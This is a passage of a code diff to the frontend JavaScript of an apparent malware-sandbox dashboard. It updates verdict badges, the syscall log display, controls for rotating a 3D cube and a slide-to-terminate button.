+        activeDetectIcon.className = 'material-symbols-outlined text-tertiary text-[28px] animate-pulse';
+      }
+      if (activeDetectTitle) {
+        activeDetectTitle.textContent = 'TAINT DETECTED';
+        activeDetectTitle.className = 'font-label-md text-label-md font-bold text-tertiary mt-1';
+      }
+      if (activeDetectSub) {
+        activeDetectSub.textContent = escapeHtml(event.title || event.description || 'POLICY TRIP');
+      }
+
+      // Update Stage 4 & 5 indicators
+      if (pipeStage4) pipeStage4.className = 'flex flex-col gap-1 p-2 rounded bg-tertiary-fixed/30 text-on-surface';
+      if (pipeDetectLabel) pipeDetectLabel.textContent = 'SIGNAL TRIP';
+      if (pipeStage5) pipeStage5.className = 'flex flex-col gap-1 p-2 rounded bg-tertiary text-on-tertiary shadow-sm';
+      if (pipeContainLabel) pipeContainLabel.textContent = 'STASIS CUBE';
+    }
+
+    // Verdict handling
+    if (event.type === 'VERDICT') {
       clearInterval(timerInterval);
+
       if (event.verdict_state === 'FROZEN') {
-        const violationSummary = (event.violations && event.violations.length > 0) ? event.violations.join('; ') : 'Severe policy trips';
-        setCerberusState('verdict', `EXECUTION FROZEN: Contained ${violationSummary}. Host system protected with zero residue.`, 'CONTAINED');
-        if (verdictBadge) {
-          verdictBadge.textContent = 'FROZEN (VIOLATION)';
-          verdictBadge.className = 'font-label-sm text-label-sm px-2 py-0.5 rounded font-mono font-bold bg-tertiary-container text-on-tertiary-container';
+        if (activeTargetStatusBadge) {
+          activeTargetStatusBadge.textContent = 'THREAT FROZEN';
+          activeTargetStatusBadge.className = 'font-label-sm text-label-sm bg-tertiary text-on-tertiary px-1 py-0.5 rounded font-bold';
+        }
+        if (pipeStage6) {
+          pipeStage6.className = 'flex flex-col gap-1 p-2 rounded bg-tertiary text-on-tertiary shadow-sm font-bold';
+        }
+        if (pipeVerdictLabel) pipeVerdictLabel.textContent = 'MALICIOUS';
+        if (activeVerdictPlaneTitle) {
+          activeVerdictPlaneTitle.textContent = 'L5: CONTAINED (ZERO EGRESS)';
+          activeVerdictPlaneTitle.className = 'font-label-sm text-label-sm text-tertiary font-bold tracking-wider';
         }
       } else if (event.verdict_state === 'CLEAN') {
-        setCerberusState('verdict', 'EXECUTION CLEAN: Target ran to completion inside the sandbox with 0 suspicious behaviors detected.', 'VERIFIED CLEAN');
-        if (verdictBadge) {
-          verdictBadge.textContent = 'CLEAN RUNTIME';
-          verdictBadge.className = 'font-label-sm text-label-sm px-2 py-0.5 rounded font-mono font-bold bg-primary text-on-primary';
+        if (activeTargetStatusBadge) {
+          activeTargetStatusBadge.textContent = 'CLEAN';
+          activeTargetStatusBadge.className = 'font-label-sm text-label-sm bg-primary text-on-primary px-1 py-0.5 rounded font-bold';
         }
-      } else {
-        setCerberusState('verdict', event.description || 'Analysis completed.', event.verdict_state || 'COMPLETE');
+        if (diagThreatScore) {
+          diagThreatScore.textContent = '0/100';
+          diagThreatScore.className = 'font-headline-sm text-headline-sm text-primary font-bold';
+        }
+        if (activeDetectNode) {
+          activeDetectNode.style.boxShadow = 'inset 0 0 0 1px rgba(0, 97, 148, 0.4)';
+        }
+        if (activeDetectIcon) {
+          activeDetectIcon.textContent = 'verified';
+          activeDetectIcon.className = 'material-symbols-outlined text-primary text-[28px]';
+        }
+        if (activeDetectTitle) {
+          activeDetectTitle.textContent = 'CLEAN CODE';
+          activeDetectTitle.className = 'font-label-md text-label-md font-bold text-primary mt-1';
+        }
+        if (activeDetectSub) {
+          activeDetectSub.textContent = 'NOMINAL EXECUTION :: EXIT 0';
+        }
+        if (pipeStage6) {
+          pipeStage6.className = 'flex flex-col gap-1 p-2 rounded bg-primary text-on-primary shadow-sm font-bold';
+        }
+        if (pipeVerdictLabel) pipeVerdictLabel.textContent = 'SAFE VERDICT';
+        if (activeVerdictPlaneTitle) {
+          activeVerdictPlaneTitle.textContent = 'L5: CLEAN RUNTIME';
+          activeVerdictPlaneTitle.className = 'font-label-sm text-label-sm text-primary font-bold tracking-wider';
+        }
       }
-    } else if (event.type === 'ERROR') {
-      clearInterval(timerInterval);
-      setCerberusState('verdict', event.description || 'Runtime error encountered.', 'ERROR');
     }
 
-    // Append to Terminal Stream
-    appendStreamEvent(event);
+    // Append to active BPF stream log
+    let callStr = event.description || event.title || event.type;
+    let statusStr = "ALLOW";
+    let typeClass = "info";
+
+    if (isViolation) {
+      statusStr = "BLOCKED";
+      typeClass = "error";
+    } else if (isContainment) {
+      statusStr = "STASIS";
+      typeClass = "warning";
+    } else if (event.type === 'VERDICT') {
+      statusStr = event.verdict_state || "DONE";
+      typeClass = "verdict";
+    }
+
+    appendActiveLog({
+      timestamp: event.timestamp || formatTimestamp(),
+      call: callStr,
+      status: statusStr,
+      type: typeClass
+    });
   }
 
-  function appendStreamEvent(event) {
-    if (!syscallStreamBox) return;
+  function appendActiveLog(entry) {
+    if (!activeSyscallBox) return;
 
     const row = document.createElement('div');
-    const category = event.category || 'system';
-    const severity = event.severity || 'info';
+    row.className = 'p-1.5 rounded flex items-center justify-between text-label-sm font-mono';
 
-    row.className = `p-1.5 rounded flex items-start justify-between gap-1 shadow-xs transition-all stream-event-row`;
-    row.dataset.category = category;
-    row.dataset.severity = severity;
-
-    // Apply color styling based on severity
-    if (severity === 'critical' || severity === 'violation') {
-      row.classList.add('bg-error-container/40', 'border-l-2', 'border-error');
-    } else if (category === 'containment') {
-      row.classList.add('bg-secondary-fixed/40', 'border-l-2', 'border-secondary');
+    if (entry.type === 'error') {
+      row.className += ' bg-error-container text-on-error-container';
+      row.innerHTML = `
+        <span class="text-on-error-container/80 text-[10px]">${escapeHtml(entry.timestamp)}</span>
+        <span class="font-bold text-error text-[11px] truncate mx-2">${escapeHtml(entry.call)}</span>
+        <span class="font-bold text-error text-[10px]">${escapeHtml(entry.status)}</span>
+      `;
+    } else if (entry.type === 'warning') {
+      row.className += ' bg-tertiary-fixed/30 text-on-surface';
+      row.innerHTML = `
+        <span class="text-outline text-[10px]">${escapeHtml(entry.timestamp)}</span>
+        <span class="font-semibold text-tertiary text-[11px] truncate mx-2">${escapeHtml(entry.call)}</span>
+        <span class="font-bold text-tertiary text-[10px]">${escapeHtml(entry.status)}</span>
+      `;
     } else {
-      row.classList.add('bg-surface-container-lowest');
+      row.className += ' bg-surface-container-low text-on-surface';
+      row.innerHTML = `
+        <span class="text-outline text-[10px]">${escapeHtml(entry.timestamp)}</span>
+        <span class="text-on-surface text-[11px] truncate mx-2">${escapeHtml(entry.call)}</span>
+        <span class="text-primary font-bold text-[10px]">${escapeHtml(entry.status)}</span>
+      `;
     }
 
-    let detailItems = '';
-    if (event.details && typeof event.details === 'object' && Object.keys(event.details).length > 0) {
-      detailItems = Object.entries(event.details)
-        .map(([k, v]) => `<span class="text-[10px] text-outline mr-2"><strong class="text-on-surface">${escapeHtml(k)}:</strong> ${escapeHtml(v)}</span>`)
-        .join('');
-      detailItems = `<div class="mt-0.5 flex flex-wrap">${detailItems}</div>`;
-    }
-
-    let catBadgeColor = 'text-primary';
-    if (category === 'network') catBadgeColor = 'text-secondary';
-    if (category === 'file') catBadgeColor = 'text-amber-600';
-    if (category === 'process') catBadgeColor = 'text-indigo-600';
-    if (category === 'containment') catBadgeColor = 'text-tertiary font-bold';
-
-    row.innerHTML = `
-      <div class="flex flex-col flex-1 min-w-0">
-        <div class="flex items-center gap-1.5">
-          <span class="font-mono text-[10px] ${catBadgeColor}">[${escapeHtml(category.toUpperCase())}]</span>
-          <span class="font-semibold text-on-surface truncate text-label-sm">${escapeHtml(event.title || event.type)}</span>
-        </div>
-        <span class="text-outline text-[11px] truncate">${escapeHtml(event.description || '')}</span>
-        ${detailItems}
-      </div>
-      <span class="text-outline-variant font-mono text-[10px] whitespace-nowrap ml-1">${escapeHtml(event.timestamp || formatTimestamp())}</span>
-    `;
-
-    // Apply active filter
-    if (currentFilter === 'violation' && severity !== 'violation' && severity !== 'critical') {
-      row.style.display = 'none';
-    } else if (currentFilter === 'containment' && category !== 'containment') {
-      row.style.display = 'none';
-    }
-
-    syscallStreamBox.appendChild(row);
-
-    // Auto-scroll
-    if (!autoscrollChk || autoscrollChk.checked) {
-      syscallStreamBox.scrollTop = syscallStreamBox.scrollHeight;
-    }
+    activeSyscallBox.appendChild(row);
+    activeSyscallBox.scrollTop = activeSyscallBox.scrollHeight;
   }
 
   // -------------------------------------------------------------
-  // 7. Terminal Filtering Controls
+  // 6. 3D Layered Ortho-Strata Cube Orientation Controller
   // -------------------------------------------------------------
-  filterBtns.forEach(btn => {
-    btn.addEventListener('click', () => {
-      filterBtns.forEach(b => {
-        b.className = "stream-filter-btn px-2 py-0.5 rounded text-[10px] font-label-sm uppercase font-semibold transition-all text-on-surface-variant hover:bg-surface-container";
-      });
-      btn.className = "stream-filter-btn px-2 py-0.5 rounded text-[10px] font-label-sm uppercase font-semibold transition-all bg-primary text-on-primary shadow-xs";
+  function updateCubeTransform() {
+    if (!enclaveCube) return;
+    enclaveCube.style.transform = `perspective(1100px) rotateX(${pitch}deg) rotateY(${yaw}deg) rotateZ(0deg) scale3d(${zoom}, ${zoom}, ${zoom})`;
 
-      currentFilter = btn.dataset.filter || 'all';
-      applyStreamFilter();
-    });
-  });
+    if (yawVal) yawVal.innerText = `${yaw}°`;
+    if (pitchVal) pitchVal.innerText = `${pitch}°`;
+    if (zoomVal) zoomVal.innerText = `${zoom.toFixed(1)}x`;
+  }
 
-  function applyStreamFilter() {
-    if (!syscallStreamBox) return;
-    const items = syscallStreamBox.querySelectorAll('.stream-event-row');
-    items.forEach(item => {
-      const cat = item.dataset.category || '';
-      const sev = item.dataset.severity || '';
+  function rotateCore(deltaYaw, deltaPitch) {
+    yaw += deltaYaw;
+    pitch += deltaPitch;
+    updateCubeTransform();
+  }
 
-      if (currentFilter === 'all') {
-        item.style.display = 'flex';
-      } else if (currentFilter === 'violation') {
-        item.style.display = (sev === 'violation' || sev === 'critical') ? 'flex' : 'none';
-      } else if (currentFilter === 'containment') {
-        item.style.display = (cat === 'containment') ? 'flex' : 'none';
-      }
+  function resetCoreView() {
+    yaw = -34;
+    pitch = 24;
+    zoom = 1.0;
+    isFocused = false;
+    updateCubeTransform();
+  }
+
+  function toggleFocusTarget() {
+    isFocused = !isFocused;
+    zoom = isFocused ? 1.3 : 1.0;
+    yaw = isFocused ? -15 : -34;
+    pitch = isFocused ? 12 : 24;
+    updateCubeTransform();
+  }
+
+  if (btnRotateLeft) btnRotateLeft.addEventListener('click', () => rotateCore(-15, 0));
+  if (btnRotateRight) btnRotateRight.addEventListener('click', () => rotateCore(15, 0));
+  if (btnResetCoreView) btnResetCoreView.addEventListener('click', resetCoreView);
+  if (btnFocusTarget) btnFocusTarget.addEventListener('click', toggleFocusTarget);
+
+  // Standby Cube Mouse Parallax & Reset
+  if (btnResetPerspective && standbyCentralCube) {
+    btnResetPerspective.addEventListener('click', () => {
+      standbyCentralCube.style.transform = 'rotateX(-24deg) rotateY(38deg)';
     });
   }
 
-  // -------------------------------------------------------------
-  // 8. Manual Emergency Containment Action
-  // -------------------------------------------------------------
-  if (btnManualContain) {
-    btnManualContain.addEventListener('click', () => {
-      setCerberusState('contain', 'Manual emergency stasis invoked. Process threads suspended.');
-      appendStreamEvent({
-        timestamp: formatTimestamp(),
-        category: 'containment',
-        severity: 'critical',
-        title: 'MANUAL_STASIS_INTERCEPT',
-        description: 'Operator manually triggered immediate thread freeze and network sever.'
-      });
-    });
-  }
-
-  // -------------------------------------------------------------
-  // 9. Exploded 3D View Toggle
-  // -------------------------------------------------------------
-  if (toggleExplodedBtn) {
-    toggleExplodedBtn.addEventListener('click', () => {
-      isExploded = !isExploded;
-      if (isExploded) {
-        if (centralCoreCube) centralCoreCube.classList.add('hidden');
-        if (explodedLayersContainer) explodedLayersContainer.classList.remove('hidden');
-        if (explodedBtnText) explodedBtnText.textContent = "COLLAPSE TO CORE";
-      } else {
-        if (centralCoreCube) centralCoreCube.classList.remove('hidden');
-        if (explodedLayersContainer) explodedLayersContainer.classList.add('hidden');
-        if (explodedBtnText) explodedBtnText.textContent = "EXPLODE 3D LAYERS";
-      }
-    });
-  }
-
-  // -------------------------------------------------------------
-  // 10. Mouse Parallax on CSS 3D Cube
-  // -------------------------------------------------------------
-  if (spatialSceneWrapper && centralCoreCube) {
+  if (spatialSceneWrapper && standbyCentralCube) {
     const parentContainer = spatialSceneWrapper.parentElement;
     if (parentContainer) {
       parentContainer.addEventListener('mousemove', (e) => {
-        if (isExploded) return;
         const rect = parentContainer.getBoundingClientRect();
         const x = e.clientX - rect.left - (rect.width / 2);
         const y = e.clientY - rect.top - (rect.height / 2);
         const rotY = 38 + (x / 24);
         const rotX = -24 - (y / 24);
-        centralCoreCube.style.transform = `rotateX(${rotX}deg) rotateY(${rotY}deg)`;
+        standbyCentralCube.style.transform = `rotateX(${rotX}deg) rotateY(${rotY}deg)`;
       });
 
       parentContainer.addEventListener('mouseleave', () => {
-        if (!isExploded) {
-          centralCoreCube.style.transform = 'rotateX(-24deg) rotateY(38deg)';
-        }
+        standbyCentralCube.style.transform = 'rotateX(-24deg) rotateY(38deg)';
       });
     }
   }
 
   // -------------------------------------------------------------
-  // 11. Three.js Interactive Defense Core Setup
+  // 7. Drag-to-Confirm Emergency Kill Slider Interaction
   // -------------------------------------------------------------
-  initThreeJsDefenseCore();
+  if (sliderTrack && sliderHandle) {
+    let isDragging = false;
+    let startX = 0;
+    let currentX = 0;
+    let maxDistance = 0;
 
-  function initThreeJsDefenseCore() {
-    const threeContainer = document.getElementById('threejs-canvas-mount');
-    if (!threeContainer || typeof THREE === 'undefined') return;
+    const computeMaxDistance = () => {
+      const trackWidth = sliderTrack.clientWidth;
+      const handleWidth = sliderHandle.clientWidth;
+      return trackWidth - handleWidth - 8;
+    };
 
-    try {
-      const width = threeContainer.clientWidth || 460;
-      const height = threeContainer.clientHeight || 420;
+    const onStart = (e) => {
+      isDragging = true;
+      startX = e.type.includes('touch') ? e.touches[0].clientX : e.clientX;
+      maxDistance = computeMaxDistance();
+      sliderHandle.style.transition = 'none';
+      if (sliderProgress) sliderProgress.style.transition = 'none';
+    };
 
-      const scene = new THREE.Scene();
-      const camera = new THREE.PerspectiveCamera(40, width / height, 0.1, 1000);
-      camera.position.set(13, 10, 15);
-      camera.lookAt(0, 0, 0);
+    const onMove = (e) => {
+      if (!isDragging) return;
+      const clientX = e.type.includes('touch') ? e.touches[0].clientX : e.clientX;
+      const delta = clientX - startX;
+      currentX = Math.max(0, Math.min(delta, maxDistance));
+      sliderHandle.style.transform = `translateX(${currentX}px)`;
+      if (sliderProgress) sliderProgress.style.width = `${currentX + 48}px`;
 
-      const renderer = new THREE.WebGLRenderer({ alpha: true, antialias: true });
-      renderer.setSize(width, height);
-      renderer.setPixelRatio(Math.min(window.devicePixelRatio || 1, 2));
-      threeContainer.appendChild(renderer.domElement);
+      if (sliderTrackText) {
+        sliderTrackText.style.opacity = currentX > maxDistance * 0.8 ? '0.1' : '0.6';
+      }
+    };
 
-      // Lighting
-      const ambientLight = new THREE.AmbientLight(0xf0f7ff, 1.3);
-      scene.add(ambientLight);
+    const onEnd = () => {
+      if (!isDragging) return;
+      isDragging = false;
+      maxDistance = computeMaxDistance();
 
-      const dirLight1 = new THREE.DirectionalLight(0x0284c7, 2.0);
-      dirLight1.position.set(15, 20, 10);
-      scene.add(dirLight1);
+      if (currentX >= maxDistance - 6) {
+        // Dispatched kill action
+        sliderHandle.style.transform = `translateX(${maxDistance}px)`;
+        if (sliderProgress) {
+          sliderProgress.style.width = '100%';
+          sliderProgress.classList.remove('bg-tertiary/20');
+          sliderProgress.classList.add('bg-tertiary');
+        }
+        if (handleIcon) handleIcon.innerText = 'done_all';
+        if (sliderTrackText) {
+          sliderTrackText.innerText = 'SANDBOX TERMINATED (SIGKILL)';
+          sliderTrackText.classList.remove('text-on-surface-variant/60');
+          sliderTrackText.classList.add('text-on-tertiary', 'opacity-100');
+        }
+        sliderTrack.classList.add('bg-tertiary');
 
-      const pointLight = new THREE.PointLight(0x38bdf8, 2.5, 25);
-      pointLight.position.set(0, 0, 0);
-      scene.add(pointLight);
-
-      // Master Rotating Group
-      const coreGroup = new THREE.Group();
-      scene.add(coreGroup);
-
-      // Grid Helper
-      const gridHelper = new THREE.GridHelper(9, 10, 0x0284c7, 0xdbeafe);
-      gridHelper.position.y = -3.2;
-      coreGroup.add(gridHelper);
-
-      // Gyroscopic Rings
-      const gyroGroup = new THREE.Group();
-      coreGroup.add(gyroGroup);
-
-      const ring1Geo = new THREE.TorusGeometry(2.2, 0.03, 16, 64);
-      const ring1Mat = new THREE.MeshBasicMaterial({ color: 0x0ea5e9, transparent: true, opacity: 0.65 });
-      const gyroRing1 = new THREE.Mesh(ring1Geo, ring1Mat);
-      gyroGroup.add(gyroRing1);
-
-      const ring2Geo = new THREE.TorusGeometry(2.4, 0.025, 16, 64);
-      const ring2Mat = new THREE.MeshBasicMaterial({ color: 0x6366f1, transparent: true, opacity: 0.5 });
-      const gyroRing2 = new THREE.Mesh(ring2Geo, ring2Mat);
-      gyroRing2.rotation.x = Math.PI / 2.4;
-      gyroGroup.add(gyroRing2);
-
-      // Inner Core
-      const innerCubeGeo = new THREE.BoxGeometry(1.8, 1.8, 1.8);
-      const innerCubeMat = new THREE.MeshPhongMaterial({
-        color: 0x0284c7,
-        emissive: 0x0369a1,
-        emissiveIntensity: 0.5,
-        shininess: 90,
-        transparent: true,
-        opacity: 0.8
-      });
-      const innerCubeMesh = new THREE.Mesh(innerCubeGeo, innerCubeMat);
-      coreGroup.add(innerCubeMesh);
-
-      const innerEdges = new THREE.EdgesGeometry(innerCubeGeo);
-      const innerWireMat = new THREE.LineBasicMaterial({ color: 0xffffff, transparent: true, opacity: 0.85 });
-      innerCubeMesh.add(new THREE.LineSegments(innerEdges, innerWireMat));
-
-      // Particles
-      const particleCount = 24;
-      const particleGeo = new THREE.BufferGeometry();
-      const particlePos = new Float32Array(particleCount * 3);
-      const particleVel = [];
-
-      for (let i = 0; i < particleCount; i++) {
-        particlePos[i * 3] = (Math.random() - 0.5) * 4.0;
-        particlePos[i * 3 + 1] = (Math.random() - 0.5) * 4.0;
-        particlePos[i * 3 + 2] = (Math.random() - 0.5) * 4.0;
-        particleVel.push({
-          x: (Math.random() - 0.5) * 0.012,
-          y: (Math.random() - 0.5) * 0.012,
-          z: (Math.random() - 0.5) * 0.012
+        // Log containment
+        appendActiveLog({
+          timestamp: formatTimestamp(),
+          call: "kernel_sigaction(SIGKILL, target_pid)",
+          status: "TERMINATED",
+          type: "warning"
         });
-      }
-      particleGeo.setAttribute('position', new THREE.BufferAttribute(particlePos, 3));
-      const particleMat = new THREE.PointsMaterial({
-        color: 0x38bdf8,
-        size: 0.12,
-        transparent: true,
-        opacity: 0.8
-      });
-      const particlesMesh = new THREE.Points(particleGeo, particleMat);
-      coreGroup.add(particlesMesh);
 
-      // Render loop
-      let clock = new THREE.Clock();
-      function animate() {
-        requestAnimationFrame(animate);
-        const elapsed = clock.getElapsedTime();
-
-        coreGroup.rotation.y += 0.003;
-        gyroRing1.rotation.z = elapsed * 0.35;
-        gyroRing1.rotation.y = elapsed * 0.18;
-        gyroRing2.rotation.x = -elapsed * 0.28;
-
-        const pulse = 1.0 + Math.sin(elapsed * 2.2) * 0.04;
-        innerCubeMesh.scale.set(pulse, pulse, pulse);
-        innerCubeMesh.rotation.y = -elapsed * 0.25;
-
-        // Drift particles
-        const pArr = particleGeo.attributes.position.array;
-        for (let i = 0; i < particleCount; i++) {
-          pArr[i * 3] += particleVel[i].x;
-          pArr[i * 3 + 1] += particleVel[i].y;
-          pArr[i * 3 + 2] += particleVel[i].z;
-
-          if (Math.abs(pArr[i * 3]) > 2.2) particleVel[i].x *= -1;
-          if (Math.abs(pArr[i * 3 + 1]) > 2.2) particleVel[i].y *= -1;
-          if (Math.abs(pArr[i * 3 + 2]) > 2.2) particleVel[i].z *= -1;
+        if (activeTargetStatusBadge) {
+          activeTargetStatusBadge.textContent = 'MANUALLY TERMINATED';
+          activeTargetStatusBadge.className = 'font-label-sm text-label-sm bg-tertiary text-on-tertiary px-1 py-0.5 rounded font-bold';
         }
-        particleGeo.attributes.position.needsUpdate = true;
 
-        renderer.render(scene, camera);
-      }
-      animate();
-
-      window.addEventListener('resize', () => {
-        const w = threeContainer.clientWidth || 460;
-        const h = threeContainer.clientHeight || 420;
-        camera.aspect = w / h;
-        camera.updateProjectionMatrix();
-        renderer.setSize(w, h);
-      });
-
-      threeCore = {
-        updateState: (theme) => {
-          if (theme === 'threat' || theme === 'contained') {
-            innerCubeMat.color.setHex(0xba1a1a);
-            innerCubeMat.emissive.setHex(0x93000b);
-            dirLight1.color.setHex(0xba1a1a);
-            pointLight.color.setHex(0xff5449);
-            ring1Mat.color.setHex(0xff5449);
-          } else if (theme === 'verdict') {
-            innerCubeMat.color.setHex(0x006194);
-            innerCubeMat.emissive.setHex(0x004b73);
-            dirLight1.color.setHex(0x0284c7);
-            pointLight.color.setHex(0x38bdf8);
-            ring1Mat.color.setHex(0x0ea5e9);
-          } else {
-            innerCubeMat.color.setHex(0x0284c7);
-            innerCubeMat.emissive.setHex(0x0369a1);
-            dirLight1.color.setHex(0x0284c7);
-            pointLight.color.setHex(0x38bdf8);
-            ring1Mat.color.setHex(0x0ea5e9);
+        setTimeout(() => {
+          sliderHandle.style.transition = 'transform 0.4s ease';
+          if (sliderProgress) {
+            sliderProgress.style.transition = 'width 0.4s ease';
+            sliderProgress.style.width = '48px';
+            sliderProgress.classList.add('bg-tertiary/20');
+            sliderProgress.classList.remove('bg-tertiary');
           }
+          sliderHandle.style.transform = 'translateX(0px)';
+          sliderTrack.classList.remove('bg-tertiary');
+          if (sliderTrackText) {
+            sliderTrackText.innerText = '>>> SLIDE TO TERMINATE SANDBOX >>>';
+            sliderTrackText.classList.add('text-on-surface-variant/60');
+            sliderTrackText.classList.remove('text-on-tertiary');
+          }
+          if (handleIcon) handleIcon.innerText = 'double_arrow';
+          currentX = 0;
+        }, 2800);
+      } else {
+        // Snap back
+        sliderHandle.style.transition = 'transform 0.3s cubic-bezier(0.16, 1, 0.3, 1)';
+        if (sliderProgress) {
+          sliderProgress.style.transition = 'width 0.3s cubic-bezier(0.16, 1, 0.3, 1)';
+          sliderProgress.style.width = '48px';
         }
-      };
-    } catch (err) {
-      console.warn('Three.js canvas initialization skipped:', err);
-    }
+        sliderHandle.style.transform = 'translateX(0px)';
+        if (sliderTrackText) sliderTrackText.style.opacity = '0.6';
+        currentX = 0;
+      }
+    };
+
+    sliderHandle.addEventListener('mousedown', onStart);
+    window.addEventListener('mousemove', onMove);
+    window.addEventListener('mouseup', onEnd);
+
+    sliderHandle.addEventListener('touchstart', onStart, { passive: true });
+    window.addEventListener('touchmove', onMove, { passive: true });
+    window.addEventListener('touchend', onEnd);
+  }
+
+  // Standby Manual Kill Button
+  if (standbyManualContain) {
+    standbyManualContain.addEventListener('click', () => {
+      alert('Upload a workload first to engage active containment stasis.');
+    });
   }
 
   // -------------------------------------------------------------
